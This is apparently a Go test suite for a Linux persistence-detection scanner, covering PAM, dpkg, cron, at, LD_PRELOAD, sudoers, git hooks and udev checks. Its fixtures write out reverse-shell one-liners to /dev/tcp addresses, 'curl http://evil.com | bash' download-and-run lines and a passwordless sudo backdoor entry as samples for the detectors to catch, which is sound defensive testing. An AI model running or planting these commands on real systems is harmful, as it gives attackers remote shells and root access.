func TestBuildDpkgOwnedFilesFrom_NilOnMissingDir(t *testing.T) {
	owned := buildDpkgOwnedFilesFrom(testAtCtx(t), "/nonexistent/path/that/does/not/exist")
	if owned != nil {
		t.Errorf("want nil when DPKG info dir is absent (signals DPKG unavailable), got map with %d entries", len(owned))
	}
}

func TestExtractPamExecPath_SimpleCase(t *testing.T) {
	line := "session optional pam_exec.so /bin/pam_exec_backdoor.sh"
	got := extractPamExecPath(line)
	if got != "/bin/pam_exec_backdoor.sh" {
		t.Errorf("got %q, want /bin/pam_exec_backdoor.sh", got)
	}
}

func TestExtractPamExecPath_WithOptions(t *testing.T) {
	line := "session optional pam_exec.so seteuid /bin/pam_exec_backdoor.sh"
	got := extractPamExecPath(line)
	if got != "/bin/pam_exec_backdoor.sh" {
		t.Errorf("got %q, want /bin/pam_exec_backdoor.sh (seteuid flag must be skipped)", got)
	}
}

func TestExtractPamExecPath_MultipleOptions(t *testing.T) {
	line := "auth required pam_exec.so quiet seteuid log=/var/log/pam.log /usr/local/bin/auth_hook.sh"
	got := extractPamExecPath(line)
	if got != "/usr/local/bin/auth_hook.sh" {
		t.Errorf("got %q, want /usr/local/bin/auth_hook.sh", got)
	}
}

func TestExtractPamExecPath_NoPamExec(t *testing.T) {
	line := "auth required pam_unix.so"
	got := extractPamExecPath(line)
	if got != "" {
		t.Errorf("got %q, want empty string for line without pam_exec.so", got)
	}
}

func TestExtractPamExecPath_NoPath(t *testing.T) {
	line := "session optional pam_exec.so seteuid quiet"
	got := extractPamExecPath(line)
	if got != "" {
		t.Errorf("got %q, want empty string when no /-prefixed token follows pam_exec.so", got)
	}
}

func TestPersistencePAM_UnpackagedModule(t *testing.T) {
	dir := t.TempDir()
	soPath := filepath.Join(dir, "pam_evil.so")
	if err := os.WriteFile(soPath, []byte("ELF"), 0644); err != nil {
		t.Fatal(err)
	}
	ownedFiles := map[string]bool{} // empty — nothing is owned
	sev, label := classifyPAMModule(soPath, ownedFiles, false)
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if label != "Unpackaged PAM module" {
		t.Errorf("label: got %q, want 'Unpackaged PAM module'", label)
	}
}

func TestPersistencePAM_SuspiciousModule_UnpackagedAndRecent(t *testing.T) {
	dir := t.TempDir()
	soPath := filepath.Join(dir, "pam_evil.so")
	os.WriteFile(soPath, []byte("ELF"), 0644)
	ownedFiles := map[string]bool{}
	sev, label := classifyPAMModule(soPath, ownedFiles, true)
	if sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", sev)
	}
	if label != "Suspicious PAM module" {
		t.Errorf("label: got %q, want 'Suspicious PAM module'", label)
	}
}

func TestPersistencePAM_RecentlyModifiedKnownModule(t *testing.T) {
	dir := t.TempDir()
	soPath := filepath.Join(dir, "pam_unix.so")
	os.WriteFile(soPath, []byte("ELF"), 0644)
	ownedFiles := map[string]bool{soPath: true} // owned by a package
	sev, label := classifyPAMModule(soPath, ownedFiles, true)
	if sev != output.MEDIUM {
		t.Errorf("sev: want MEDIUM, got %s", sev)
	}
	if label != "Recently modified PAM module" {
		t.Errorf("label: got %q, want 'Recently modified PAM module'", label)
	}
}

func TestPersistencePAM_CleanPackagedModule(t *testing.T) {
	dir := t.TempDir()
	soPath := filepath.Join(dir, "pam_unix.so")
	os.WriteFile(soPath, []byte("ELF"), 0644)
	ownedFiles := map[string]bool{soPath: true}
	sev, label := classifyPAMModule(soPath, ownedFiles, false)
	if sev != "" {
		t.Errorf("want no finding for clean packaged module, got sev=%s label=%s", sev, label)
	}
}

func TestClassifyPAMModule_NilOwnedFiles_SkipsUnpackagedCheck(t *testing.T) {
	// nil ownedFiles means DPKG is unavailable (e.g. RHEL/Oracle).
	// Must not flag unpackaged; only recency check applies.
	dir := t.TempDir()
	soPath := filepath.Join(dir, "pam_unix.so")
	os.WriteFile(soPath, []byte("ELF"), 0644)

	sev, label := classifyPAMModule(soPath, nil, false)
	if sev != "" {
		t.Errorf("nil ownedFiles + not recent: want no finding, got sev=%s label=%s", sev, label)
	}
}

func TestClassifyPAMModule_NilOwnedFiles_StillFlagsRecent(t *testing.T) {
	dir := t.TempDir()
	soPath := filepath.Join(dir, "pam_unix.so")
	os.WriteFile(soPath, []byte("ELF"), 0644)

	sev, label := classifyPAMModule(soPath, nil, true)
	if sev != output.MEDIUM {
		t.Errorf("nil ownedFiles + recently modified: want MEDIUM, got sev=%s", sev)
	}
	if label != "Recently modified PAM module" {
		t.Errorf("label: got %q, want 'Recently modified PAM module'", label)
	}
}

func TestPersistencePAM_SymlinkResolution(t *testing.T) {
	// Simulates Debian 13+: /lib is a symlink to /usr/lib.
	// DPKG lists /usr/lib/.../pam_unix.so but we scan /lib/.../pam_unix.so.
	realDir := t.TempDir()
	soRealPath := filepath.Join(realDir, "pam_unix.so")
	if err := os.WriteFile(soRealPath, []byte("ELF"), 0644); err != nil {
		t.Fatal(err)
	}

	linkDir := filepath.Join(t.TempDir(), "security")
	if err := os.Symlink(realDir, linkDir); err != nil {
		t.Skip("symlinks not supported:", err)
	}
	linkPath := filepath.Join(linkDir, "pam_unix.so")

	// ownedFiles uses the real (canonical) path, as DPKG .list files do
	ownedFiles := map[string]bool{soRealPath: true}

	// Pre-fix: unresolved path misses ownedFiles → flagged as unpackaged
	sevPre, _ := classifyPAMModule(linkPath, ownedFiles, false)
	if sevPre == "" {
		t.Fatal("pre-condition: expected linkPath to miss ownedFiles, but it didn't — test setup is wrong")
	}

	// Post-fix behavior: resolve symlink before lookup → clean
	resolved, err := filepath.EvalSymlinks(linkPath)
	if err != nil {
		t.Fatal("EvalSymlinks:", err)
	}
	sevPost, _ := classifyPAMModule(resolved, ownedFiles, false)
	if sevPost != "" {
		t.Errorf("resolved path should be clean (owned by DPKG), got sev=%s", sevPost)
	}
}

// TestPersistencePAM_SymlinkResolution_Ubuntu simulates Ubuntu where DPKG records
// /lib/... paths (not the canonical /usr/lib/... path after the /lib→/usr/lib symlink).
// The call-site fallback in persistencePAM re-uses the original path when the resolved
// path is absent from ownedFiles but the original is present.
func TestPersistencePAM_SymlinkResolution_Ubuntu(t *testing.T) {
	realDir := t.TempDir()
	soRealPath := filepath.Join(realDir, "pam_unix.so")
	if err := os.WriteFile(soRealPath, []byte("ELF"), 0644); err != nil {
		t.Fatal(err)
	}

	linkDir := filepath.Join(t.TempDir(), "security")
	if err := os.Symlink(realDir, linkDir); err != nil {
		t.Skip("symlinks not supported:", err)
	}
	linkPath := filepath.Join(linkDir, "pam_unix.so")

	resolved, err := filepath.EvalSymlinks(linkPath)
	if err != nil {
		t.Fatal("EvalSymlinks:", err)
	}
	if resolved == linkPath {
		t.Skip("EvalSymlinks did not change path — symlink test is a no-op")
	}

	// Ubuntu: ownedFiles records the /lib/... path, not the canonical /usr/lib/... path.
	ownedFiles := map[string]bool{linkPath: true}

	// Without fallback: resolved path misses ownedFiles → incorrectly flagged.
	sevNoFallback, _ := classifyPAMModule(resolved, ownedFiles, false)
	if sevNoFallback == "" {
		t.Fatal("pre-condition: expected resolved path to miss Ubuntu ownedFiles, but it didn't")
	}

	// Call-site fallback: when resolved path misses but original path hits, use original.
	effectiveLookup := resolved
	if !ownedFiles[resolved] && ownedFiles[linkPath] {
		effectiveLookup = linkPath
	}
	sevWithFallback, _ := classifyPAMModule(effectiveLookup, ownedFiles, false)
	if sevWithFallback != "" {
		t.Errorf("with fallback: original path owned by DPKG, must not be flagged; got sev=%s", sevWithFallback)
	}
}

func TestScanDpkgLifecycleScripts_DetectsMalicious(t *testing.T) {
	ctx := testAtCtx(t)
	dir := t.TempDir()
	content := "#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
	if err := os.WriteFile(filepath.Join(dir, "evil.postinst"), []byte(content), 0755); err != nil {
		t.Fatal(err)
	}
	hits := scanDpkgLifecycleScripts(ctx, dir)
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d", len(hits))
	}
	if hits[0].sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", hits[0].sev)
	}
	if hits[0].label != "Malicious DPKG lifecycle script" {
		t.Errorf("label: got %q", hits[0].label)
	}
}

func TestScanDpkgLifecycleScripts_IgnoresNonLifecycleFiles(t *testing.T) {
	ctx := testAtCtx(t)
	dir := t.TempDir()
	content := "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
	os.WriteFile(filepath.Join(dir, "pkg.list"), []byte(content), 0644)
	os.WriteFile(filepath.Join(dir, "pkg.md5sums"), []byte(content), 0644)
	hits := scanDpkgLifecycleScripts(ctx, dir)
	if len(hits) != 0 {
		t.Errorf("want 0 hits for non-lifecycle files, got %d", len(hits))
	}
}

func TestScanDpkgLifecycleScripts_SkipsDpkgOwnFiles(t *testing.T) {
	ctx := testAtCtx(t)
	dir := t.TempDir()
	content := "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
	os.WriteFile(filepath.Join(dir, "dpkg.postinst"), []byte(content), 0755)
	hits := scanDpkgLifecycleScripts(ctx, dir)
	if len(hits) != 0 {
		t.Errorf("want 0 hits for dpkg.* files, got %d", len(hits))
	}
}

func TestScanDpkgLifecycleScripts_AllExtensions(t *testing.T) {
	ctx := testAtCtx(t)
	dir := t.TempDir()
	payload := "#!/bin/bash\ncurl http://evil.com | bash\n"
	for _, ext := range []string{".postinst", ".preinst", ".prerm", ".postrm"} {
		os.WriteFile(filepath.Join(dir, "pkg"+ext), []byte(payload), 0755)
	}
	hits := scanDpkgLifecycleScripts(ctx, dir)
	if len(hits) != 4 {
		t.Errorf("want 4 hits (one per lifecycle extension), got %d", len(hits))
	}
}

func TestClassifyFileLinesSkipsOctalSUID(t *testing.T) {
	content := "#!/bin/bash\nchmod 4755 /usr/bin/foo\n"
	skip := map[string]bool{"chmod setting SUID/SGID bit (octal notation)": true}
	sev, _, _ := classifyFileLines(content, skip)
	if sev != "" {
		t.Errorf("want no finding with skip, got sev=%s", sev)
	}
}

func TestClassifyFileLinesOctalSUIDFiresWithoutSkip(t *testing.T) {
	content := "chmod 4755 /usr/bin/foo\n"
	sev, reason, _ := classifyFileLines(content, nil)
	if sev != output.HIGH {
		t.Errorf("want HIGH without skip, got %s", sev)
	}
	if reason != "chmod setting SUID/SGID bit (octal notation)" {
		t.Errorf("reason: got %q", reason)
	}
}

func TestScanDpkgLifecycleScripts_IgnoresOctalSUID(t *testing.T) {
	ctx := testAtCtx(t)
	dir := t.TempDir()
	p := filepath.Join(dir, "pkg.postinst")
	content := "#!/bin/bash\nchmod 4755 /usr/bin/foo\n"
	if err := os.WriteFile(p, []byte(content), 0755); err != nil {
		t.Fatal(err)
	}
	old := time.Now().Add(-73 * time.Hour)
	os.Chtimes(p, old, old)
	hits := scanDpkgLifecycleScripts(ctx, dir)
	if len(hits) != 0 {
		t.Errorf("want 0 hits for octal SUID in lifecycle script, got %d", len(hits))
	}
}

func TestScanCronScriptDir_DetectsMalicious(t *testing.T) {
	ctx := testAtCtx(t)
	dir := t.TempDir()
	content := "#!/bin/bash\ncurl http://evil.com/payload | bash\n"
	if err := os.WriteFile(filepath.Join(dir, "evil-script"), []byte(content), 0755); err != nil {
		t.Fatal(err)
	}
	hits := scanCronScriptDir(ctx, dir)
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d", len(hits))
	}
	if hits[0].sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", hits[0].sev)
	}
	if hits[0].label != "Malicious cron script" {
		t.Errorf("label: got %q", hits[0].label)
	}
}

func TestScanCronScriptDir_Clean(t *testing.T) {
	ctx := testAtCtx(t)
	dir := t.TempDir()
	p := filepath.Join(dir, "logrotate")
	os.WriteFile(p, []byte("#!/bin/bash\n/usr/sbin/logrotate /etc/logrotate.conf\n"), 0755)
	old := time.Now().Add(-73 * time.Hour)
	os.Chtimes(p, old, old)
	hits := scanCronScriptDir(ctx, dir)
	if len(hits) != 0 {
		t.Errorf("clean script: want 0 hits, got %d", len(hits))
	}
}

func TestScanCronScriptDir_MissingDir(t *testing.T) {
	ctx := testAtCtx(t)
	hits := scanCronScriptDir(ctx, "/nonexistent/pathfinder-test-cron-dir")
	if hits != nil {
		t.Errorf("missing dir: want nil, got %v", hits)
	}
}

func TestExtractAnacronCommand_Basic(t *testing.T) {
	got := extractAnacronCommand("7  25  cron.weekly  run-parts /etc/cron.weekly")
	if got != "run-parts /etc/cron.weekly" {
		t.Errorf("got %q, want 'run-parts /etc/cron.weekly'", got)
	}
}

func TestExtractAnacronCommand_TooFewFields(t *testing.T) {
	if got := extractAnacronCommand("7 25 cron.weekly"); got != "" {
		t.Errorf("too few fields: got %q, want empty", got)
	}
}

func TestExtractAnacronCommand_Comment(t *testing.T) {
	if got := extractAnacronCommand("# this is a comment"); got != "" {
		t.Errorf("comment: got %q, want empty", got)
	}
}

func TestExtractAnacronCommand_MaliciousCommand(t *testing.T) {
	cmd := extractAnacronCommand("1  5  daily.job  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
	if cmd == "" {
		t.Fatal("want non-empty command extracted from anacrontab line")
	}
	sev, _ := classifyShellCommand(cmd)
	if sev != output.HIGH {
		t.Errorf("malicious anacron command: sev want HIGH, got %s", sev)
	}
}

func TestClassifyLDPreloadEntries_MalwareDirEntry(t *testing.T) {
	results := classifyLDPreloadEntries([]string{"/tmp/evil.so"})
	if len(results) != 1 {
		t.Fatalf("want 1 result, got %d", len(results))
	}
	if results[0].sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", results[0].sev)
	}
	if results[0].label != "Malicious LD_PRELOAD entry" {
		t.Errorf("label: got %q", results[0].label)
	}
	if !strings.Contains(results[0].msg, "/tmp/evil.so") {
		t.Errorf("msg: want path in message, got %q", results[0].msg)
	}
}

func TestClassifyLDPreloadEntries_MissingFile(t *testing.T) {
	results := classifyLDPreloadEntries([]string{"/usr/lib/pathfinder-test-nonexistent-ldpreload-8675309.so"})
	if len(results) != 1 {
		t.Fatalf("want 1 result, got %d", len(results))
	}
	if results[0].sev != output.MEDIUM {
		t.Errorf("sev: want MEDIUM, got %s", results[0].sev)
	}
	if results[0].label != "Missing LD_PRELOAD library" {
		t.Errorf("label: got %q", results[0].label)
	}
}

func TestClassifyLDPreloadEntries_ExistingCleanFile(t *testing.T) {
	var cleanPath string
	for _, p := range []string{"/bin/sh", "/usr/bin/env", "/bin/bash"} {
		if _, err := os.Stat(p); err == nil {
			cleanPath = p
			break
		}
	}
	if cleanPath == "" {
		t.Skip("no candidate system binary found")
	}
	results := classifyLDPreloadEntries([]string{cleanPath})
	if len(results) != 0 {
		t.Errorf("existing non-staging file: want 0 results, got %d", len(results))
	}
}

func TestClassifyLDPreloadEntries_IgnoresCommentsAndBlanks(t *testing.T) {
	results := classifyLDPreloadEntries([]string{"# comment", "", "  ", "/tmp/evil.so"})
	if len(results) != 1 {
		t.Errorf("want 1 result (comment and blanks ignored), got %d", len(results))
	}
}

func TestClassifyLDSoConfEntries_StagingPath_High(t *testing.T) {
	results := classifyLDSoConfEntries("/etc/ld.so.conf", []string{"/tmp/evil-lib"})
	if len(results) != 1 {
		t.Fatalf("want 1 result, got %d", len(results))
	}
	if results[0].sev != output.HIGH {
		t.Errorf("sev: want HIGH, got %s", results[0].sev)
	}
	if results[0].label != "Malicious ld.so.conf entry" {
		t.Errorf("label: got %q", results[0].label)
	}
	if !strings.Contains(results[0].msg, "/tmp/evil-lib") {
		t.Errorf("msg: want path in message, got %q", results[0].msg)
	}
}

func TestClassifyLDSoConfEntries_SystemPath_Clean(t *testing.T) {
	results := classifyLDSoConfEntries("/etc/ld.so.conf", []string{"/usr/lib/x86_64-linux-gnu"})
	if len(results) != 0 {
		t.Errorf("system path: want 0 results, got %d", len(results))
	}
}

func TestClassifyLDSoConfEntries_IncludeDirective_Skipped(t *testing.T) {
	results := classifyLDSoConfEntries("/etc/ld.so.conf", []string{"include /etc/ld.so.conf.d/*.conf"})
	if len(results) != 0 {
		t.Errorf("include directive must be skipped, got %d results", len(results))
	}
}

func TestClassifyLDSoConfEntries_CommentsAndBlanks_Skipped(t *testing.T) {
	results := classifyLDSoConfEntries("/etc/ld.so.conf", []string{"# comment", "", "  ", "/tmp/evil"})
	if len(results) != 1 {
		t.Errorf("want 1 result (comments/blanks skipped), got %d", len(results))
	}
}

func testAtCtx(t *testing.T) *ModuleContext {
	t.Helper()
	baseDir := t.TempDir()
	persistDir := t.TempDir()
	logPath := filepath.Join(baseDir, "commands.log")
	log, err := output.NewMasterLog(logPath)
	if err != nil {
		t.Fatal(err)
	}
	return &ModuleContext{
		Dirs:     Dirs{Base: baseDir, Persistence: persistDir},
		Registry: output.NewRegistry(),
		Log:      log,
	}
}

func TestPersistenceAtQueue_MaliciousContentFiresRegistry(t *testing.T) {
	ctx := testAtCtx(t)
	atDir := t.TempDir()
	content := "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
	if err := os.WriteFile(filepath.Join(atDir, "a00001"), []byte(content), 0600); err != nil {
		t.Fatal(err)
	}
	persistenceAtQueueDirs(ctx, []string{atDir})
	found := false
	for _, e := range ctx.Registry.All() {
		if e.Label == "Malicious at/batch job" {
			found = true
		}
	}
	if !found {
		t.Errorf("want 'Malicious at/batch job' registry entry; got: %+v", ctx.Registry.All())
	}
}

func TestPersistenceAtQueue_CleanJobNoMaliciousEntry(t *testing.T) {
	ctx := testAtCtx(t)
	atDir := t.TempDir()
	content := "#!/bin/sh\n/usr/bin/find /home -mtime +30 -delete\n"
	os.WriteFile(filepath.Join(atDir, "a00002"), []byte(content), 0600)
	persistenceAtQueueDirs(ctx, []string{atDir})
	for _, e := range ctx.Registry.All() {
		if e.Label == "Malicious at/batch job" {
			t.Errorf("clean at job must not fire malicious entry; got: %+v", e)
		}
	}
}

func TestParseGitConfigValues_HooksPath(t *testing.T) {
	conf := "[core]\n\thooksPath = /tmp/evil-hooks\n\tpager = less\n"
	vals := parseGitConfigValues(conf, "pager", "hooksPath")
	if vals[0] != "less" {
		t.Errorf("pager: got %q, want less", vals[0])
	}
	if vals[1] != "/tmp/evil-hooks" {
		t.Errorf("hooksPath: got %q, want /tmp/evil-hooks", vals[1])
	}
}

func TestClassifyGitHooksPath_StagingPath_High(t *testing.T) {
	sev, label := classifyGitHooksPath("/tmp/evil-hooks")
	if sev != output.HIGH {
		t.Errorf("staging path: sev want HIGH, got %s", sev)
	}
	if !strings.Contains(label, "staging") {
		t.Errorf("label: want 'staging' in %q", label)
	}
}

func TestClassifyGitHooksPath_CustomPath_Medium(t *testing.T) {
	sev, label := classifyGitHooksPath("/home/user/.config/git/hooks")
	if sev != output.MEDIUM {
		t.Errorf("custom path: sev want MEDIUM, got %s", sev)
	}
	_ = label
}

func TestClassifyGitHooksPath_SystemPath_Clean(t *testing.T) {
	sev, _ := classifyGitHooksPath("/usr/share/git-core/templates/hooks")
	if sev != "" {
		t.Errorf("system path: want no finding, got sev=%s", sev)
	}
}

func TestClassifyGitHooksPath_Empty_Clean(t *testing.T) {
	sev, _ := classifyGitHooksPath("")
	if sev != "" {
		t.Errorf("empty: want no finding, got sev=%s", sev)
	}
}

func TestPersistenceSSHAuthorizedKeys_ReportsKeys(t *testing.T) {
	ctx := testAtCtx(t)
	home := t.TempDir()
	sshDir := filepath.Join(home, ".ssh")
	os.MkdirAll(sshDir, 0700)
	content := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITestKey user@host\n"
	os.WriteFile(filepath.Join(sshDir, "authorized_keys"), []byte(content), 0600)

	persistenceSSHAuthorizedKeysRoots(ctx, []string{home})

	if len(ctx.Registry.All()) == 0 {
		t.Error("want at least one registry entry for authorized_keys")
	}
}

func TestPersistenceSSHAuthorizedKeys_EmptyFile_NoEntry(t *testing.T) {
	ctx := testAtCtx(t)
	home := t.TempDir()
	sshDir := filepath.Join(home, ".ssh")
	os.MkdirAll(sshDir, 0700)
	os.WriteFile(filepath.Join(sshDir, "authorized_keys"), []byte("# comment only\n"), 0600)

	persistenceSSHAuthorizedKeysRoots(ctx, []string{home})

	if len(ctx.Registry.All()) != 0 {
		t.Error("comment-only file must not produce registry entries")
	}
}

func TestPersistenceSSHAuthorizedKeys_NoFile_NoEntry(t *testing.T) {
	ctx := testAtCtx(t)
	home := t.TempDir() // no .ssh dir

	persistenceSSHAuthorizedKeysRoots(ctx, []string{home})

	if len(ctx.Registry.All()) != 0 {
		t.Errorf("missing file must not produce entries, got %+v", ctx.Registry.All())
	}
}

func TestPersistenceSSHAuthorizedKeys_MultipleHomes(t *testing.T) {
	ctx := testAtCtx(t)
	homes := make([]string, 3)
	for i := range homes {
		homes[i] = t.TempDir()
		sshDir := filepath.Join(homes[i], ".ssh")
		os.MkdirAll(sshDir, 0700)
		os.WriteFile(filepath.Join(sshDir, "authorized_keys"),
			[]byte("ssh-rsa AAAA... user@host\n"), 0600)
	}

	persistenceSSHAuthorizedKeysRoots(ctx, homes)

	if len(ctx.Registry.All()) < 3 {
		t.Errorf("want at least 3 entries (one per home), got %d", len(ctx.Registry.All()))
	}
}

func TestPersistenceSudoers_NOPASSWDAll_HighFinding(t *testing.T) {
	ctx := testAtCtx(t)
	sudoersPath := filepath.Join(t.TempDir(), "sudoers")
	if err := os.WriteFile(sudoersPath, []byte("attacker ALL=(ALL) NOPASSWD: ALL\n"), 0440); err != nil {
		t.Fatal(err)
	}
	scanSudoersFile(ctx, nil, sudoersPath, false)
	found := false
	for _, f := range ctx.Registry.All() {
		if f.Label == "Sudoers NOPASSWD:ALL grant" && f.Severity == output.HIGH {
			found = true
		}
	}
	if !found {
		t.Errorf("want HIGH 'Sudoers NOPASSWD:ALL grant', got: %v", ctx.Registry.All())
	}
}

func TestPersistenceSudoers_NOPASSWDPartial_MediumFinding(t *testing.T) {
	ctx := testAtCtx(t)
	sudoersPath := filepath.Join(t.TempDir(), "sudoers")
	if err := os.WriteFile(sudoersPath, []byte("bob ALL=(ALL) NOPASSWD: /usr/bin/systemctl\n"), 0440); err != nil {
		t.Fatal(err)
	}
	scanSudoersFile(ctx, nil, sudoersPath, false)
	found := false
	for _, f := range ctx.Registry.All() {
		if f.Label == "Sudoers NOPASSWD grant" && f.Severity == output.MEDIUM {
			found = true
		}
	}
	if !found {
		t.Errorf("want MEDIUM 'Sudoers NOPASSWD grant', got: %v", ctx.Registry.All())
	}
}

func TestPersistenceSudoers_RecentDropin_MediumFinding(t *testing.T) {
	ctx := testAtCtx(t)
	dropinPath := filepath.Join(t.TempDir(), "99-backdoor")
	// Write a benign (no NOPASSWD) but freshly created drop-in.
	// recentlyModified returns true because the file was just written.
	if err := os.WriteFile(dropinPath, []byte("# just a comment\n"), 0440); err != nil {
		t.Fatal(err)
	}
	scanSudoersFile(ctx, nil, dropinPath, true)
	found := false
	for _, f := range ctx.Registry.All() {
		if f.Label == "Recently modified sudoers drop-in" && f.Severity == output.MEDIUM {
			found = true
		}
	}
	if !found {
		t.Errorf("want MEDIUM 'Recently modified sudoers drop-in', got: %v", ctx.Registry.All())
	}
}

func TestPersistenceSudoers_Clean_NoFindings(t *testing.T) {
	ctx := testAtCtx(t)
	sudoersPath := filepath.Join(t.TempDir(), "sudoers")
	if err := os.WriteFile(sudoersPath, []byte("root ALL=(ALL:ALL) ALL\n"), 0440); err != nil {
		t.Fatal(err)
	}
	// Backdate the file so recentlyModified returns false.
	past := time.Now().Add(-96 * time.Hour)
	if err := os.Chtimes(sudoersPath, past, past); err != nil {
		t.Fatal(err)
	}
	scanSudoersFile(ctx, nil, sudoersPath, true)
	if len(ctx.Registry.All()) != 0 {
		t.Errorf("want 0 findings for clean sudoers, got %d: %v", len(ctx.Registry.All()), ctx.Registry.All())
	}
}

func TestClassifyShellCommand_StagingProximity(t *testing.T) {
	cases := []struct {
		cmd     string
		wantSev output.Severity
	}{
		{"/tmp/evil_binary --args", output.HIGH},     // executed from staging
		{"bash /tmp/payload.sh", output.HIGH},        // interpreter verb
		{"curl http://x -o /var/tmp/p", output.HIGH}, // transfer verb
		{"echo data > /tmp/log", output.LOW},         // redirect target, no verb
		{"cat /dev/shm/cache", output.LOW},           // benign read of staging path
		{". /tmp/evil", output.HIGH},                 // source-dot execution
		{"$(/tmp/evil)", output.HIGH},                // command substitution
		{"find /tmp/ . -name x", output.LOW},         // "." is current-dir arg, not source
	}
	for _, c := range cases {
		sev, _ := classifyShellCommand(c.cmd)
		if sev != c.wantSev {
			t.Errorf("classifyShellCommand(%q) sev = %s, want %s", c.cmd, sev, c.wantSev)
		}
	}
}

func TestNormalizeModName_DashUnderscore(t *testing.T) {
	if got := normalizeModName("custom-lkm"); got != "custom_lkm" {
		t.Errorf("got %q, want custom_lkm", got)
	}
	if got := normalizeModName("already_ok"); got != "already_ok" {
		t.Errorf("got %q, want already_ok", got)
	}
}

func TestUdevImportProgram(t *testing.T) {
	got, ok := udevImportProgram(`IMPORT{program}="/tmp/evil.sh"`)
	if !ok || got != "/tmp/evil.sh" {
		t.Fatalf("got %q ok=%v, want /tmp/evil.sh true", got, ok)
	}
	if _, ok := udevImportProgram(`ACTION=="add", SUBSYSTEM=="block"`); ok {
		t.Fatal("want ok=false for a line with no IMPORT{program}")
	}
}
